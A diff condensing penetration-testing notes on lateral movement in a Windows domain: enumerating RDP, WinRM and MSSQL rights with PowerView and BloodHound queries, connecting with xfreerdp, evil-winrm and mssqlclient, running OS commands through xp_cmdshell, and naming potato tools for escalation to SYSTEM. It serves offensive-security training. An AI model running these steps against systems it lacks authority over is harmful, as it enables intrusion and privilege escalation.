@@ -1,75 +1,56 @@
 **Overview:**
-Once we gain a foothold in the domain, our goal shifts to advancing our position further by moving laterally or vertically to obtain access to other hosts, and eventually achieve domain compromise or some other goal, depending on the aim of the assessment. Typically, if we take over an account with local admin rights over a host, or set of hosts, we can perform a `Pass-the-Hash` attack to authenticate via the SMB protocol.
-
-There are several other ways we can move around a Windows domain:
-
-- `Remote Desktop Protocol` (`RDP`) - is a remote access/management protocol that gives us GUI access to a target host
-- [PowerShell Remoting](https://docs.microsoft.com/en-us/powershell/scripting/learn/ps101/08-powershell-remoting?view=powershell-7.2) - also referred to as PSRemoting or Windows Remote Management (WinRM) access, is a remote access protocol that allows us to run commands or enter an interactive command-line session on a remote host using PowerShell
-- `MSSQL Server` - an account with sysadmin privileges on an SQL Server instance can log into the instance remotely and execute queries against the database. This access can be used to run operating system commands in the context of the SQL Server service account through various methods
-
-We can enumerate this access in various ways. The easiest, once again, is via BloodHound, as the following edges exist to show us what types of remote access privileges a given user has:
-
-- [CanRDP](https://bloodhound.specterops.io/resources/edges/can-rdp)
-- [CanPSRemote](https://bloodhound.specterops.io/resources/edges/can-ps-remote)
-- [SQLAdmin](https://bloodhound.specterops.io/resources/edges/sql-admin)
-Typically, if we have control of a local admin user on a given machine, we will be able to access it via RDP. Sometimes, we will obtain a foothold with a user that does not have local admin rights anywhere, but does have the rights to RDP into one or more machines. 
-- Like RDP, we may find that either a specific user or an entire group has WinRM access to one or more hosts. This could also be low-privileged access that we could use to hunt for sensitive data or attempt to escalate privileges or may result in local admin access, which could potentially be leveraged to further our access
-- More often than not, we will encounter SQL servers in the environments we face. It is common to find user and service accounts set up with sysadmin privileges on a given SQL server instance. We may obtain credentials for an account with this access via Kerberoasting (common) or others such as LLMNR/NBT-NS Response Spoofing or password spraying. Another way that you may find SQL server credentials is using the tool [Snaffler](https://github.com/SnaffCon/Snaffler) to find web.config or other types of configuration files that contain SQL server connection strings.
+- Post-foothold lateral movement targets RDP, WinRM, and MSSQL to expand access across the domain. Each vector can be enumerated via BloodHound edges (`CanRDP`, `CanPSRemote`, `SQLAdmin`) before attempting access.
+- RDP requires local admin or explicit group membership on the target. Even non-admin accounts can have RDP rights, making it useful for pivoting into hosts where privilege escalation can then be attempted.
+- WinRM (PSRemoting) allows remote command execution and interactive PowerShell sessions. Access may be low-privileged but still useful for credential hunting or escalation.
+- MSSQL instances with sysadmin accounts expose `xp_cmdshell`, enabling OS command execution in the context of the SQL Server service account. Combined with `SeImpersonatePrivilege`, this often leads to SYSTEM via potato-style attacks.
+- BloodHound Cypher queries can map which users have each type of access across the domain without noisy enumeration.
 ---
 ## RDP
 
 ```
-Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Desktop Users"
+Get-NetLocalGroupMember -ComputerName <target> -GroupName "Remote Desktop Users"
 ```
-use the [Get-NetLocalGroupMember](https://powersploit.readthedocs.io/en/latest/Recon/Get-NetLocalGroupMember/) function to begin enumerating members of the `Remote Desktop Users` group on a given host
-If we gain control over a user through an attack such as LLMNR/NBT-NS Response Spoofing or Kerberoasting, we can search for the username in BloodHound to check what type of remote access rights they have either directly or inherited via group membership under `Execution Rights` on the `Node Info` tab.
-	
+
+Enumerates members of the Remote Desktop Users group on a target host using PowerView.
 
 ```
 xfreerdp /v:<target-ip> /u:<user> /p:<password> /drive:share,<local-path>
 ```
 
-Connects to target via RDP and mounts a local directory as a shared drive. 
+Connects to the target via RDP and mounts a local directory as a shared drive for file transfer.
 
 ---
 ## WinRM
+
 ```
-Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Management Users"
+Get-NetLocalGroupMember -ComputerName <target> -GroupName "Remote Management Users"
 ```
-use the PowerView function `Get-NetLocalGroupMember` to the `Remote Management Users` group.
+
+Enumerates members of the Remote Management Users group on a target host using PowerView.
 
 ```
 MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:CanPSRemote*1..]->(c:Computer) RETURN p2
 ```
-utilize this custom `Cypher query` in BloodHound to hunt for users with this type of access. This can be done by pasting the query into the `Raw Query` box at the bottom of the screen and hitting enter.
+
+BloodHound Cypher query to identify all users with WinRM access across the domain. Copy into the Raw Query box.
+
+>**Windows:**
 
 ```
 $password = ConvertTo-SecureString "<password>" -AsPlainText -Force
-```
-
-Creates a SecureString variable for the password.
-
-**windows**
-
-```
 $cred = New-Object System.Management.Automation.PSCredential ("<domain>\<user>", $password)
-```
-
-Creates a PSCredential object with username and password.
-
-```
 Enter-PSSession -ComputerName <target> -Credential $cred
 ```
 
-Establishes a PowerShell session with the target over WinRM.
+Creates a credential object and establishes an interactive PowerShell session over WinRM.
 
-**Linux**
+>**Linux:**
 
 ```
 evil-winrm -i <target-ip> -u <user> -p <password>
 ```
 
-Establishes a PowerShell session with a Windows target using WinRM. 
+Establishes an interactive PowerShell session over WinRM from Linux.
 
 ---
 ## MSSQL
@@ -77,36 +58,43 @@ Establishes a PowerShell session with a Windows target using WinRM.
 ```
 MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:SQLAdmin*1..]->(c:Computer) RETURN p2
 ```
-finding this type of access via the `SQLAdmin` edge. We can check for `SQL Admin Rights` in the `Node Info` tab for a given user or use this custom Cypher query to search.
 
-**windows**
+BloodHound Cypher query to identify users with SQL Admin rights across the domain.
+
+>**Windows:**
 
 ```
 Import-Module .\PowerUpSQL.ps1
-```
-
-Imports the PowerUpSQL tool.
-```
 Get-SQLInstanceDomain
 ```
-enumerate the domain for SQL server instances.
+
+Imports PowerUpSQL and enumerates all SQL Server instances registered in the domain.
 
 ```
 Get-SQLQuery -Verbose -Instance "<target-ip>,1433" -username "<domain>\<user>" -password "<password>" -query '<query>'
 ```
 
-Connects to an SQL server and executes a query.
+Connects to a specific MSSQL instance and executes a query. `-Verbose` shows connection details.
 
-**Linux**
+> **Linux:**
 
 ```
 mssqlclient.py <domain>/<user>@<target-ip>
 ```
 
-Connects to an MSSQL server. Impacket tool. 
+Connects to an MSSQL instance using Impacket. Prompts for password interactively.
 
-#### enable_xp_cmdshell
+---
+## xp_cmdshell Execution
+
+```sql
+enable_xp_cmdshell
 ```
-SQL> enable_xp_cmdshell
+
+Enables `xp_cmdshell` from within an `mssqlclient.py` session. Required before running OS commands.
+
+```sql
+xp_cmdshell <command>
 ```
-run commands in the format `xp_cmdshell <command>`. Here we can enumerate the rights that our user has on the system and see that we have [SeImpersonatePrivilege](https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/seimpersonateprivilege-secreateglobalprivilege), which can be leveraged in combination with a tool such as [JuicyPotato](https://github.com/ohpe/juicy-potato), [PrintSpoofer](https://github.com/itm4n/PrintSpoofer), or [RoguePotato](https://github.com/antonioCoco/RoguePotato) to escalate to `SYSTEM` level privileges, depending on the target host, and use this access to continue toward our goal.
+
+Executes an OS command in the context of the SQL Server service account. If the output returns`SeImpersonatePrivilege`, escalation to SYSTEM via PrintSpoofer, RoguePotato, or JuicyPotato is likely viable depending on the OS version.
